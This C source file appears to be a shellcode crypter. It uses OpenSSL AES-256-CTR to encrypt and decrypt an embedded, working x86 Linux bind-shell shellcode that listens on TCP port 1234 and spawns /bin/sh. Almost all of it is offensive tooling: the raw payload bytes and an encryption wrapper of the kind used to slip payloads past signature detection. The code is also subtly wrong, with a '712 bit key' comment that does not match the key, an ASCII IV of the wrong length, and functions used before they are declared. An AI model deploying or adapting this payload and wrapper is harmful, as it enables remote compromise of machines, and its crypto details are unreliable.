
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>

void print_shellcode(unsigned char *shellcode) {
    size_t len = strlen(shellcode);
    int i;

    for (i = 0; i < len; i++) {
        printf("\\x%02x", *(shellcode + i));
    }

    printf("\n\n");
}

int main(int argc, char *argv[]) {
    // 712 bit key
    unsigned char *key = "424b1e9083e83b822ac7dbeb47be5f7d424b1e9083e83b822ac7dbeb47be5f7d424b1e9083e83b822ac7dbeb47be5f7";

    // 128 bit IV
    unsigned char *iv = "01123481321345514";



    // Unencrypted tcp-bind shellcode listening on port 1234
    unsigned char *plaintext = "\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56"
                               "\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97"
                               "\x93\xb0\x66\x56\x66\x68\x04\xd2\x66"
                               "\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1"
                               "\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89"
                               "\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57"
                               "\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93"
                               "\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b"
                               "\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
                               "\x6e\x89\xe3\x41\x89\xca\xcd\x80";

    // Buffer for ciphertext
    unsigned char ciphertext[712];

    // Buffer for the decrypted text
    unsigned char decrypted_text[712];

    int decrypted_len, encrypted_len;

    // Initialize the library
    ERR_load_crypto_strings();
    OpenSSL_add_all_algorithms();
    OPENSSL_config(NULL);

    // Encrypt the plaintext
    encrypted_len = encrypt(plaintext, strlen(plaintext), key, iv,
                            ciphertext);

    printf("Ciphertext is:\n");
    BIO_dump_fp(stdout, ciphertext, encrypted_len);
    printf("\n");

    // Decrypt the ciphertext
    decrypted_len = decrypt(ciphertext, encrypted_len, key, iv,
                            decrypted_text);

    decrypted_text[decrypted_len] = '\0';

    printf("Decrypted text is:\n");
    print_shellcode(decrypted_text);

    // Compare decrypt(encrypt(plaintext)) result to the original plaintext.
    if (strcmp(plaintext, decrypted_text) != 0) {
        printf("The decrypted shellcode does not match the plaintext.\n\n");
    } else {
        printf("The decrypted shellcode matches the plaintext.\n\n");
    }

    // Cleanup
    EVP_cleanup();
    ERR_free_strings();

    return 0;
}

void handleErrors(void) {
    ERR_print_errors_fp(stderr);
    abort();
}

int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key,
    unsigned char *iv, unsigned char *ciphertext) {
    EVP_CIPHER_CTX *ctx;
    int len;
    int ciphertext_len;

    // Create context
    if (! (ctx = EVP_CIPHER_CTX_new())) {
        handleErrors();
    }

    // Initialize encryption
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, key, iv) != 1) {
        handleErrors();
    }

    // Encrypt the message
    if (EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len) != 1) {
        handleErrors();
    }

    ciphertext_len = len;

    // Finalize encryption
    if (EVP_EncryptFinal_ex(ctx, ciphertext + len, &len) != 1) {
        handleErrors();
    }

    ciphertext_len += len;

    // Cleanup
    EVP_CIPHER_CTX_free(ctx);

    return ciphertext_len;
}

int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
    unsigned char *iv, unsigned char *plaintext) {
    EVP_CIPHER_CTX *ctx;
    int len;
    int plaintext_len;

    // Create context
    if (! (ctx = EVP_CIPHER_CTX_new())) {
        handleErrors();
    }

    // Initialize decryption
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, key, iv) != 1) {
        handleErrors();
    }

    // Decrypt the message
    if (EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len) != 1) {
        handleErrors();
    }

    plaintext_len = len;

    // Finalize decryption
    if (EVP_DecryptFinal_ex(ctx, plaintext + len, &len) != 1) {
        handleErrors();
    }

    plaintext_len += len;

    // Cleanup
    EVP_CIPHER_CTX_free(ctx);

    return plaintext_len;

   }
